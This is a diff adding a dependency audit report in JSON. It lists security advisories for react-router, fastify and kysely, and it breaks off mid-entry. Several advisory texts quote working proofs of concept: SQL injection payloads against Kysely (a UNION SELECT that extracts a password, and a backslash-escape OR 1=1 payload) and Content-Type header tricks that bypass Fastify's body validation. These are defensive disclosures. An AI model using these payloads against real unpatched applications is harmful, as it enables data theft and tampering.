@@ -1,0 +1,803 @@
+{
+  "actions": [],
+  "advisories": {
+    "1112053": {
+      "findings": [
+        {
+          "version": "7.9.0",
+          "paths": [
+            "apps__web>react-router"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/remix-run/react-router/security/advisories/GHSA-2w69-qvjg-hvjx\n- https://nvd.nist.gov/vuln/detail/CVE-2026-22029\n- https://github.com/advisories/GHSA-2w69-qvjg-hvjx",
+      "created": "2026-01-08T20:54:18.000Z",
+      "id": 1112053,
+      "npm_advisory_id": null,
+      "overview": "React Router (and Remix v1/v2) SPA open navigation redirects originating from loaders or actions in [Framework Mode](https://reactrouter.com/start/modes#framework), [Data Mode](https://reactrouter.com/start/modes#data), or the unstable RSC modes can result in unsafe URLs causing unintended javascript execution on the client. This is only an issue if developers are creating redirect paths from untrusted content or via an open redirect.\n\n> [!NOTE]\n> This does not impact applications that use [Declarative Mode](https://reactrouter.com/start/modes#declarative) (`<BrowserRouter>`).",
+      "reported_by": null,
+      "title": "React Router vulnerable to XSS via Open Redirects",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-22029"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "react-router",
+      "vulnerable_versions": ">=7.0.0 <=7.11.0",
+      "github_advisory_id": "GHSA-2w69-qvjg-hvjx",
+      "recommendation": "Upgrade to version 7.12.0 or later",
+      "patched_versions": ">=7.12.0",
+      "updated": "2026-01-11T14:54:15.000Z",
+      "cvss": {
+        "score": 8,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-2w69-qvjg-hvjx"
+    },
+    "1112877": {
+      "findings": [
+        {
+          "version": "5.6.1",
+          "paths": [
+            "apps__api>fastify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fastify/security/advisories/GHSA-jx2c-rxcm-jvmq\n- https://github.com/fastify/fastify/commit/32d7b6add39ddf082d92579a58bea7018c5ac821\n- https://hackerone.com/reports/3464114\n- https://fastify.dev/docs/latest/Reference/Validation-and-Serialization\n- https://github.com/fastify/fastify/blob/759e9787b5669abf953068e42a17bffba7521348/lib/content-type-parser.js#L125\n- https://github.com/fastify/fastify/blob/759e9787b5669abf953068e42a17bffba7521348/lib/validation.js#L272\n- https://nvd.nist.gov/vuln/detail/CVE-2026-25223\n- https://github.com/advisories/GHSA-jx2c-rxcm-jvmq",
+      "created": "2026-02-02T22:23:29.000Z",
+      "id": 1112877,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA validation bypass vulnerability exists in Fastify where request body validation schemas specified by Content-Type can be completely circumvented. By appending a tab character (`\\t`) followed by arbitrary content to the Content-Type header, attackers can bypass body validation while the server still processes the body as the original content type.\n\nFor example, a request with `Content-Type: application/json\\ta` will bypass JSON schema validation but still be parsed as JSON.\n\nThis vulnerability affects all Fastify users who rely on Content-Type-based body validation schemas to enforce data integrity or security constraints. The concrete impact depends on the handler implementation and the level of trust placed in the validated request body, but at the library level, this allows complete bypass of body validation for any handler using Content-Type-discriminated schemas.\n\nThis issue is a regression or missed edge case from the fix for a previously reported vulnerability.\n\n### Patches\n\nThis vulnerability has been patched in **Fastify v5.7.2**. All users should upgrade to this version or later immediately.\n\n### Workarounds\n\nIf upgrading is not immediately possible, user can implement a custom `onRequest` hook to reject requests containing tab characters in the Content-Type header:\n\n```javascript\nfastify.addHook('onRequest', async (request, reply) => {\n  const contentType = request.headers['content-type']\n  if (contentType && contentType.includes('\\t')) {\n    reply.code(400).send({ error: 'Invalid Content-Type header' })\n  }\n})\n```\n\n### Resources\n\n- https://github.com/fastify/fastify/blob/759e9787b5669abf953068e42a17bffba7521348/lib/validation.js#L272\n- https://github.com/fastify/fastify/blob/759e9787b5669abf953068e42a17bffba7521348/lib/content-type-parser.js#L125\n- [Fastify Validation and Serialization Documentation](https://fastify.dev/docs/latest/Reference/Validation-and-Serialization/)\n- https://hackerone.com/reports/3464114",
+      "reported_by": null,
+      "title": "Fastify's Content-Type header tab character allows body validation bypass",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-25223"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "fastify",
+      "vulnerable_versions": "<5.7.2",
+      "github_advisory_id": "GHSA-jx2c-rxcm-jvmq",
+      "recommendation": "Upgrade to version 5.7.2 or later",
+      "patched_versions": ">=5.7.2",
+      "updated": "2026-02-04T17:46:03.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-436"
+      ],
+      "url": "https://github.com/advisories/GHSA-jx2c-rxcm-jvmq"
+    },
+    "1115131": {
+      "findings": [
+        {
+          "version": "0.28.7",
+          "paths": [
+            "apps__api>kysely"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/kysely-org/kysely/security/advisories/GHSA-wmrf-hv6w-mr66\n- https://github.com/kysely-org/kysely/commit/0a602bff2f442f6c26d5e047ca8f8715179f6d24\n- https://github.com/kysely-org/kysely/releases/tag/v0.28.12\n- https://nvd.nist.gov/vuln/detail/CVE-2026-32763\n- https://github.com/advisories/GHSA-wmrf-hv6w-mr66",
+      "created": "2026-03-18T12:59:32.000Z",
+      "id": 1115131,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nKysely through 0.28.11 has a SQL injection vulnerability in JSON path compilation for MySQL and SQLite dialects. The `visitJSONPathLeg()` function appends user-controlled values from `.key()` and `.at()` directly into single-quoted JSON path string literals (`'$.key'`) without escaping single quotes. An attacker can break out of the JSON path string context and inject arbitrary SQL.\n\nThis is inconsistent with `sanitizeIdentifier()`, which properly doubles delimiter characters for identifiers — both are non-parameterizable SQL constructs requiring manual escaping, but only identifiers are protected.\n\n### Details\n\n`visitJSONPath()` wraps JSON path in single quotes (`'$...'`), and `visitJSONPathLeg()` appends each key/index value via `this.append(String(node.value))` with no sanitization:\n\n```javascript\n// dist/cjs/query-compiler/default-query-compiler.js\nvisitJSONPath(node) {\n    if (node.inOperator) {\n        this.visitNode(node.inOperator);\n    }\n    this.append(\"'$\");\n    for (const pathLeg of node.pathLegs) {\n        this.visitNode(pathLeg);        // Each leg appended without escaping\n    }\n    this.append(\"'\");\n}\nvisitJSONPathLeg(node) {\n    const isArrayLocation = node.type === 'ArrayLocation';\n    this.append(isArrayLocation ? '[' : '.');\n    this.append(String(node.value));    // <-- NO single quote escaping\n    if (isArrayLocation) {\n        this.append(']');\n    }\n}\n```\n\nContrast with `sanitizeIdentifier()` in the same file, which properly doubles delimiter characters:\n\n```javascript\nsanitizeIdentifier(identifier) {\n    const leftWrap = this.getLeftIdentifierWrapper();\n    const rightWrap = this.getRightIdentifierWrapper();\n    let sanitized = '';\n    for (const c of identifier) {\n        sanitized += c;\n        if (c === leftWrap) { sanitized += leftWrap; }\n        else if (c === rightWrap) { sanitized += rightWrap; }\n    }\n    return sanitized;\n}\n```\n\nBoth identifiers and JSON path keys are non-parameterizable SQL constructs that require manual escaping. Identifiers are protected; JSON path values are not.\n\nPostgreSQL is **not affected**. The branching happens in `JSONPathBuilder.#createBuilderWithPathLeg()` (`json-path-builder.js`):\n\n- **MySQL/SQLite** operators (`->$`, `->>$`) produce a `JSONPathNode` traversal → `visitJSONPathLeg()` concatenates the key directly into a single-quoted JSON path string (`'$.key'`) — **vulnerable**, no escaping.\n- **PostgreSQL** operators (`->`, `->>`) produce a `JSONOperatorChainNode` traversal → `ValueNode.createImmediate(value)` → `appendImmediateValue()` → `appendStringLiteral()` → **`sanitizeStringLiteral()` doubles single quotes** (`'` → `''`), generating chained operators (`\"col\"->>'city'`). Injection payload becomes a harmless string literal.\n\nSame `.key()` call, different internal node creation depending on the operator type. The PostgreSQL path reuses the existing string literal sanitization; the MySQL/SQLite JSON path construction bypasses it entirely.\n\n### PoC\n\nEnd-to-end proof against a real SQLite database (Kysely 0.28.11 + better-sqlite3):\n\n```javascript\nconst Database = require('better-sqlite3');\nconst { Kysely, SqliteDialect } = require('kysely');\n\nconst sqliteDb = new Database(':memory:');\nsqliteDb.exec(`\n  CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, profile TEXT);\n  INSERT INTO users VALUES (1, 'alice', '{\"city\": \"Seoul\", \"age\": 30}');\n  INSERT INTO users VALUES (2, 'bob', '{\"city\": \"Tokyo\", \"age\": 25}');\n  CREATE TABLE admin (id INTEGER PRIMARY KEY, password TEXT);\n  INSERT INTO admin VALUES (1, 'SUPER_SECRET_PASSWORD_123');\n`);\n\nconst db = new Kysely({ dialect: new SqliteDialect({ database: sqliteDb }) });\n\nasync function main() {\n  // Safe usage\n  const safe = await db\n    .selectFrom('users')\n    .select(eb => eb.ref('profile', '->>$').key('city').as('city'))\n    .execute();\n  console.log(\"Safe:\", safe);\n  // [ { city: 'Seoul' }, { city: 'Tokyo' } ]\n\n  // Injection via .key() — exfiltrate admin password\n  const malicious = `city' as \"city\" from \"users\" UNION SELECT password FROM admin -- `;\n  const attack = await db\n    .selectFrom('users')\n    .select(eb => eb.ref('profile', '->>$').key(malicious).as('city'))\n    .execute();\n  console.log(\"Injected:\", attack);\n  // [ { city: 'SUPER_SECRET_PASSWORD_123' }, { city: 'Seoul' }, { city: 'Tokyo' } ]\n}\nmain();\n```\n\nThe payload includes `as \"city\" from \"users\"` to complete the first SELECT before the UNION. The `--` comments out the trailing `' as \"city\" from \"users\"` appended by Kysely.\n\nGenerated SQL:\n\n```sql\nselect \"profile\"->>'$.city' as \"city\" from \"users\" UNION SELECT password FROM admin -- ' as \"city\" from \"users\"\n```\n\n### Realistic application pattern\n\n```javascript\napp.get('/api/products', async (req, res) => {\n  const field = req.query.field || 'name';\n  const products = await db\n    .selectFrom('products')\n    .select(eb => eb.ref('metadata', '->>$').key(field).as('value'))\n    .execute();\n  res.json(products);\n});\n```\n\nDynamic JSON field selection is a common pattern in search APIs, GraphQL resolvers, and admin panels that expose JSON column data.\n\n### Suggested fix\n\nEscape single quotes in JSON path values within `visitJSONPathLeg()`, similar to how `sanitizeIdentifier()` doubles delimiter characters. Alternatively, validate that JSON path keys contain only safe characters. The direction of the fix is left to the maintainers.\n\n### Impact\n\n**SQL Injection (CWE-89)** — An attacker can inject arbitrary SQL via crafted JSON key names passed to `.key()` or `.at()`, enabling UNION-based data exfiltration from any database table. MySQL and SQLite dialects are affected. PostgreSQL is not affected.",
+      "reported_by": null,
+      "title": "SQL Injection via unsanitized JSON path keys when ignoring/silencing compilation errors or using `Kysely<any>`.",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-32763"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "kysely",
+      "vulnerable_versions": ">=0.26.0 <=0.28.11",
+      "github_advisory_id": "GHSA-wmrf-hv6w-mr66",
+      "recommendation": "Upgrade to version 0.28.12 or later",
+      "patched_versions": ">=0.28.12",
+      "updated": "2026-03-20T21:16:26.000Z",
+      "cvss": {
+        "score": 8.2,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-89"
+      ],
+      "url": "https://github.com/advisories/GHSA-wmrf-hv6w-mr66"
+    },
+    "1115531": {
+      "findings": [
+        {
+          "version": "0.28.7",
+          "paths": [
+            "apps__api>kysely"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/kysely-org/kysely/security/advisories/GHSA-8cpq-38p9-67gx\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33468\n- https://github.com/advisories/GHSA-8cpq-38p9-67gx",
+      "created": "2026-03-20T20:48:55.000Z",
+      "id": 1115531,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nKysely's `DefaultQueryCompiler.sanitizeStringLiteral()` only escapes single quotes by doubling them (`'` → `''`) but does not escape backslashes. When used with the MySQL dialect (where `NO_BACKSLASH_ESCAPES` is OFF by default), an attacker can use a backslash to escape the trailing quote of a string literal, breaking out of the string context and injecting arbitrary SQL. This affects any code path that uses `ImmediateValueTransformer` to inline values — specifically `CreateIndexBuilder.where()` and `CreateViewBuilder.as()`.\n\n## Details\n\nThe root cause is in `DefaultQueryCompiler.sanitizeStringLiteral()`:\n\n**`src/query-compiler/default-query-compiler.ts:1819-1821`**\n```typescript\nprotected sanitizeStringLiteral(value: string): string {\n  return value.replace(LIT_WRAP_REGEX, \"''\")\n}\n```\n\nWhere `LIT_WRAP_REGEX` is defined as `/'/g` (line 121). This only doubles single quotes — it does not escape backslash characters.\n\nThe function is called from `appendStringLiteral()` which wraps the sanitized value in single quotes:\n\n**`src/query-compiler/default-query-compiler.ts:1841-1845`**\n```typescript\nprotected appendStringLiteral(value: string): void {\n  this.append(\"'\")\n  this.append(this.sanitizeStringLiteral(value))\n  this.append(\"'\")\n}\n```\n\nThis is reached when `visitValue()` encounters an immediate value node (line 525-527), which is created by `ImmediateValueTransformer` used in `CreateIndexBuilder.where()`:\n\n**`src/schema/create-index-builder.ts:266-278`**\n```typescript\nwhere(...args: any[]): any {\n  const transformer = new ImmediateValueTransformer()\n\n  return new CreateIndexBuilder({\n    ...this.#props,\n    node: QueryNode.cloneWithWhere(\n      this.#props.node,\n      transformer.transformNode(\n        parseValueBinaryOperationOrExpression(args),\n        this.#props.queryId,\n      ),\n    ),\n  })\n}\n```\n\nThe `MysqlQueryCompiler` (at `src/dialect/mysql/mysql-query-compiler.ts:6-75`) extends `DefaultQueryCompiler` but does **not** override `sanitizeStringLiteral`, inheriting the backslash-unaware implementation.\n\n**Exploitation mechanism:**\n\nIn MySQL with the default `NO_BACKSLASH_ESCAPES=OFF` setting, the backslash character (`\\`) acts as an escape character inside string literals. Given input `\\' OR 1=1 --`:\n\n1. `sanitizeStringLiteral` doubles the quote: `\\'' OR 1=1 --`\n2. `appendStringLiteral` wraps: `'\\'' OR 1=1 --'`\n3. MySQL interprets `\\'` as an escaped (literal) single quote, so the string content is `'` and the second `'` closes the string\n4. ` OR 1=1 --` is parsed as SQL\n\n## PoC\n\n```typescript\nimport { Kysely, MysqlDialect } from 'kysely'\nimport { createPool } from 'mysql2'\n\ninterface Database {\n  orders: {\n    id: number\n    status: string\n    order_nr: string\n  }\n}\n\nconst db = new Kysely<Database>({\n  dialect: new MysqlDialect({\n    pool: createPool({\n      host: 'localhost',\n      database: 'test',\n      user: 'root',\n      password: 'password',\n    }),\n  }),\n})\n\n// Simulates user-controlled input reaching CreateIndexBuilder.where()\nconst userInput = \"\\\\' OR 1=1 --\"\n\nconst query = db.schema\n  .createIndex('orders_status_index')\n  .on('orders')\n  .column('status')\n  .where('status', '=', userInput)\n\n// Compile to see the generated SQL\nconst compiled = query.compile()\nconsole.log(compiled.sql)\n// Output: create index `orders_status_index` on `orders` (`status`) where `status` = '\\'' OR 1=1 --'\n//\n// MySQL parses this as:\n//   WHERE `status` = '\\'   ← string literal containing a single quote\n//   ' OR 1=1 --'          ← injected SQL (OR 1=1), comment eats trailing quote\n```\n\nTo verify against a live MySQL instance:\n\n```sql\n-- Setup\nCREATE DATABASE test;\nUSE test;\nCREATE TABLE orders (id INT PRIMARY KEY, status VARCHAR(50), order_nr VARCHAR(50));\nINSERT INTO orders VALUES (1, 'active', '001'), (2, 'cancelled', '002');\n\n-- The compiled query from Kysely with injected payload:\n-- This returns all rows instead of filtering by status\nSELECT * FROM orders WHERE status = '\\'' OR 1=1 -- ';\n```\n\n## Impact\n\n- **SQL Injection:** An attacker who controls values passed to `CreateIndexBuilder.where()` or `CreateViewBuilder.as()` can inject arbitrary SQL statements when the application uses the MySQL dialect.\n- **Data Exfiltration:** Injected SQL can read arbitrary data from the database using UNION-based or subquery-based techniques.\n- **Data Modification/Destruction:** Stacked queries or subqueries can modify or delete data.\n- **Authentication Bypass:** If index creation or view definitions are influenced by user input in application logic, the injection can alter query semantics to bypass access controls.\n\nThe attack complexity is rated High (AC:H) because exploitation requires an application to pass untrusted user input into DDL schema builder methods, which is an atypical but not impossible usage pattern. The `CreateIndexBuilder.where()` docstring (line 247) notes \"Parameters are always sent as literals due to database restrictions\" without warning about the security implications.\n\n## Recommended Fix\n\n`MysqlQueryCompiler` should override `sanitizeStringLiteral` to escape backslashes before doubling quotes:\n\n**`src/dialect/mysql/mysql-query-compiler.ts`**\n```typescript\nconst LIT_WRAP_REGEX = /'/g\nconst BACKSLASH_REGEX = /\\\\/g\n\nexport class MysqlQueryCompiler extends DefaultQueryCompiler {\n  // ... existing overrides ...\n\n  protected override sanitizeStringLiteral(value: string): string {\n    // Escape backslashes first (\\ → \\\\), then double single quotes (' → '')\n    // MySQL treats backslash as an escape character by default (NO_BACKSLASH_ESCAPES=OFF)\n    return value.replace(BACKSLASH_REGEX, '\\\\\\\\').replace(LIT_WRAP_REGEX, \"''\")\n  }\n}\n```\n\nAlternatively, the library could use parameterized queries for these DDL builders where the database supports it, avoiding string literal interpolation entirely. For databases that don't support parameters in DDL statements, the dialect-specific compiler must escape all characters that have special meaning in that dialect's string literal syntax.",
+      "reported_by": null,
+      "title": "Kysely has a MySQL SQL Injection via Insufficient Backslash Escaping in `sql.lit(string)` usage or similar methods that append string literal values into the compiled SQL strings",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33468"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "kysely",
+      "vulnerable_versions": "<=0.28.13",
+      "github_advisory_id": "GHSA-8cpq-38p9-67gx",
+      "recommendation": "Upgrade to version 0.28.14 or later",
+      "patched_versions": ">=0.28.14",
+      "updated": "2026-03-27T20:57:34.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-89"
+      ],
+      "url": "https://github.com/advisories/GHSA-8cpq-38p9-67gx"
+    },
+    "1117061": {
+      "findings": [
+        {
+          "version": "5.6.1",
+          "paths": [
+            "apps__api>fastify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fastify/security/advisories/GHSA-247c-9743-5963\n- https://nvd.nist.gov/vuln/detail/CVE-2025-32442\n- https://github.com/fastify/fastify/commit/f3d2bcb3963cd570a582e5d39aab01a9ae692fe4\n- https://github.com/fastify/fastify/releases/tag/v5.8.5\n- https://github.com/fastify/fastify/security/advisories/GHSA-mg2h-6x62-wpwc\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33806\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/advisories/GHSA-247c-9743-5963",
+      "created": "2026-04-15T19:24:41.000Z",
+      "id": 1117061,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nA validation bypass vulnerability exists in Fastify v5.x where request body validation schemas specified via `schema.body.content` can be completely circumvented by prepending a single space character (`\\x20`) to the `Content-Type` header. The body is still parsed correctly as JSON (or any other content type), but schema validation is entirely skipped.\nThis is a regression introduced by commit [`f3d2bcb`](https://github.com/fastify/fastify/commit/f3d2bcb3963cd570a582e5d39aab01a9ae692fe4) (fix for [CVE-2025-32442](https://github.com/fastify/fastify/security/advisories/GHSA-mg2h-6x62-wpwc)).\n\n### Details\nThe vulnerability is a **parser-validator differential** between two independent code paths that process the raw `Content-Type` header differently.\n**Parser path** (`lib/content-type.js`, line ~67) applies `trimStart()` before processing:\n```js\nconst type = headerValue.slice(0, sepIdx).trimStart().toLowerCase()\n// ' application/json' → trimStart() → 'application/json' → body is parsed ✓\n```\n\n**Validator path** (`lib/validation.js`, line 272) splits on `/[ ;]/` before trimming:\n\n```js\nfunction getEssenceMediaType(header) {\n  if (!header) return ''\n  return header.split(/[ ;]/, 1)[0].trim().toLowerCase()\n}\n// ' application/json'.split(/[ ;]/, 1) → ['']  (splits on the leading space!)\n// ''.trim() → ''\n// context[bodySchema][''] → undefined → NO validator found → validation skipped!\n```\n\nThe `ContentType` class applies `trimStart()` before processing, so the parser correctly identifies `application/json` and parses the body. However, `getEssenceMediaType` splits on `/[ ;]/` before trimming, so the leading space becomes a split point, producing an empty string. The validator looks up a schema for content-type `\"\"`, finds nothing, and skips validation entirely.\n**Regression source:** Commit [`f3d2bcb`](https://github.com/fastify/fastify/commit/f3d2bcb3963cd570a582e5d39aab01a9ae692fe4) (April 18, 2025) changed the split delimiter from `';'` to `/[ ;]/` to fix [CVE-2025-32442](https://github.com/fastify/fastify/security/advisories/GHSA-mg2h-6x62-wpwc). The old code (`header.split(';', 1)[0].trim()`) was **not** vulnerable to this vector because `.trim()` would correctly handle the leading space. The new regex-based split introduced the regression.\n\n### PoC\n\n```js\nconst fastify = require('fastify')({ logger: false });\n\nfastify.post('/transfer', {\n  schema: {\n    body: {\n      content: {\n        'application/json': {\n          schema: {\n            type: 'object',\n            required: ['amount', 'recipient'],\n            properties: {\n              amount: { type: 'number', maximum: 1000 },\n              recipient: { type: 'string', maxLength: 50 },\n              admin: { type: 'boolean', enum: [false] }\n            },\n            additionalProperties: false\n          }\n        }\n      }\n    }\n  }\n}, async (request) => {\n  return { processed: true, data: request.body };\n});\n\n(async () => {\n  await fastify.ready();\n\n  // BLOCKED — normal request with invalid payload\n  const res1 = await fastify.inject({\n    method: 'POST',\n    url: '/transfer',\n    headers: { 'content-type': 'application/json' },\n    payload: JSON.stringify({ amount: 9999, recipient: 'EVIL', admin: true })\n  });\n  console.log('Normal:', res1.statusCode);\n  // → 400 FST_ERR_VALIDATION\n\n  // BYPASS — single leading space\n  const res2 = await fastify.inject({\n    method: 'POST',\n    url: '/transfer',\n    headers: { 'content-type': ' application/json' },\n    payload: JSON.stringify({ amount: 9999, recipient: 'EVIL', admin: true })\n  });\n  console.log('Leading space:', res2.statusCode);\n  // → 200 (validation bypassed!)\n  console.log('Body:', res2.body);\n\n  await fastify.close();\n})();\n```\n\n**Output:**\n```\nNormal: 400\nLeading space: 200\nBody: {\"processed\":true,\"data\":{\"amount\":9999,\"recipient\":\"EVIL\",\"admin\":true}}\n```\n\n### Impact\nAny Fastify application that relies on <code>schema.body.content</code> (per-content-type body validation) to enforce data integrity or security constraints is affected. An attacker can bypass all body validation by adding a single space before the Content-Type value. The attack requires no authentication and has zero complexity — it is a single-character modification to an HTTP header.\nThis vulnerability is distinct from all previously patched content-type bypasses:\n\nCVE | Vector | Patched in 5.8.4?\n-- | -- | --\nCVE-2025-32442 | Casing / semicolon whitespace | ✅ Yes\nCVE-2026-25223 | Tab character (\\t) | ✅ Yes\nCVE-2026-3419 | Trailing garbage after subtype | ✅ Yes\nThis finding | Leading space (\\x20) | ❌ No\n\n\n**Recommended fix** — add `trimStart()` before the split in `getEssenceMediaType`:\n```js\nfunction getEssenceMediaType(header) {\n  if (!header) return ''\n  return header.trimStart().split(/[ ;]/, 1)[0].trim().toLowerCase()\n}\n```",
+      "reported_by": null,
+      "title": "Fastify has a Body Schema Validation Bypass via Leading Space in Content-Type Header",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33806"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "fastify",
+      "vulnerable_versions": ">=5.3.2 <=5.8.4",
+      "github_advisory_id": "GHSA-247c-9743-5963",
+      "recommendation": "Upgrade to version 5.8.5 or later",
+      "patched_versions": ">=5.8.5",
+      "updated": "2026-04-24T20:42:06.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-1287"
+      ],
+      "url": "https://github.com/advisories/GHSA-247c-9743-5963"
+    },
+    "1120063": {
+      "findings": [
+        {
+          "version": "7.9.0",
+          "paths": [
+            "apps__web>react-router"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/remix-run/react-router/security/advisories/GHSA-49rj-9fvp-4h2h\n- https://nvd.nist.gov/vuln/detail/CVE-2026-42211\n- https://github.com/advisories/GHSA-49rj-9fvp-4h2h",
+      "created": "2026-06-03T21:03:32.000Z",
+      "id": 1120063,
+      "npm_advisory_id": null,
+      "overview": "When using React Router v7 in [Framework Mode](https://reactrouter.com/start/modes#framework), there exists a combination of steps that could potentially allow unauthorized RCE through external requests.  This first requires the application code to have an existing prototype pollution vulnerability.  This can be leveraged into a 2-step attack in which the second step can trigger unauthorized RCE on the remote server.\n\n> [!NOTE]\n> This does not impact your React Router application if you are using [Declarative Mode](https://reactrouter.com/start/modes#declarative) (`<BrowserRouter>`) or [Data Mode](https://reactrouter.com/start/modes#data) (`createBrowserRouter`/`<RouterProvider>`).",
+      "reported_by": null,
+      "title": "React Router's vendored turbo-stream v2 allows arbitrary constructor invocation via TYPE_ERROR deserialization leading to Unauth RCE",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-42211"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "react-router",
+      "vulnerable_versions": ">=7.0.0 <=7.14.1",
+      "github_advisory_id": "GHSA-49rj-9fvp-4h2h",
+      "recommendation": "Upgrade to version 7.14.2 or later",
+      "patched_versions": ">=7.14.2",
+      "updated": "2026-06-03T21:03:33.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-502"
+      ],
+      "url": "https://github.com/advisories/GHSA-49rj-9fvp-4h2h"
+    },
+    "1120066": {
+      "findings": [
+        {
+          "version": "7.9.0",
+          "paths": [
+            "apps__web>react-router"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/remix-run/react-router/security/advisories/GHSA-8646-j5j9-6r62\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33245\n- https://github.com/advisories/GHSA-8646-j5j9-6r62",
+      "created": "2026-06-03T20:33:32.000Z",
+      "id": 1120066,
+      "npm_advisory_id": null,
+      "overview": "When using React Router v7's unstable RSC APIs, there exists a potential client-side XSS issue in the RSC redirect handling if redirects are coming from untrusted sources\n\n> [!NOTE]\n> This only impacts your application if you are using the unstable RSC APIs in React Router.",
+      "reported_by": null,
+      "title": "React Router vulnerable to XSS in unstable RSC redirect handling via javascript: redirect targets",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33245"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "react-router",
+      "vulnerable_versions": ">=7.7.0 <7.13.2",
+      "github_advisory_id": "GHSA-8646-j5j9-6r62",
+      "recommendation": "Upgrade to version 7.13.2 or later",
+      "patched_versions": ">=7.13.2",
+      "updated": "2026-06-03T20:33:33.000Z",
+      "cvss": {
+        "score": 8,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-8646-j5j9-6r62"
+    },
+    "1120069": {
+      "findings": [
+        {
+          "version": "7.9.0",
+          "paths": [
+            "apps__web>react-router"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/remix-run/react-router/security/advisories/GHSA-8x6r-g9mw-2r78\n- https://nvd.nist.gov/vuln/detail/CVE-2026-42342\n- https://github.com/advisories/GHSA-8x6r-g9mw-2r78",
+      "created": "2026-06-03T21:05:17.000Z",
+      "id": 1120069,
+      "npm_advisory_id": null,
+      "overview": "There exists a potential DOS attack vector in React Router Framework Mode applications (as well as Remix v2.10.0 - 2.17.4).  Certain requests can be crafted to consume disproportionate resources on the server, resulting in response time degredation and/or service unavailability for end users.\n\n> [!NOTE]\n> This does not impact your React Router application if you are using [Declarative Mode](https://reactrouter.com/start/modes#declarative) (`<BrowserRouter>`) or [Data Mode](https://reactrouter.com/start/modes#data) (`createBrowserRouter`/`<RouterProvider>`).",
+      "reported_by": null,
+      "title": "React Router vulnerable to DoS via unbounded path expansion in __manifest endpoint",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-42342"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "react-router",
+      "vulnerable_versions": ">=7.0.0 <7.15.0",
+      "github_advisory_id": "GHSA-8x6r-g9mw-2r78",
+      "recommendation": "Upgrade to version 7.15.0 or later",
+      "patched_versions": ">=7.15.0",
+      "updated": "2026-06-03T21:05:18.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400"
+      ],
+      "url": "https://github.com/advisories/GHSA-8x6r-g9mw-2r78"
+    },
+    "1120081": {
+      "findings": [
+        {
+          "version": "7.9.0",
+          "paths": [
+            "apps__web>react-router"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/remix-run/react-router/security/advisories/GHSA-rxv8-25v2-qmq8\n- https://nvd.nist.gov/vuln/detail/CVE-2026-34077\n- https://github.com/remix-run/react-router/commit/59811921d3c7d599077b8cadccdcd65a233165e0\n- https://github.com/jacob-ebey/turbo-stream/blob/v2.4.1/src/flatten.ts#L175-L177\n- https://github.com/jacob-ebey/turbo-stream/blob/v2.4.1/src/unflatten.ts#L185-L189\n- https://github.com/advisories/GHSA-rxv8-25v2-qmq8",
+      "created": "2026-06-04T15:23:51.000Z",
+      "id": 1120081,
+      "npm_advisory_id": null,
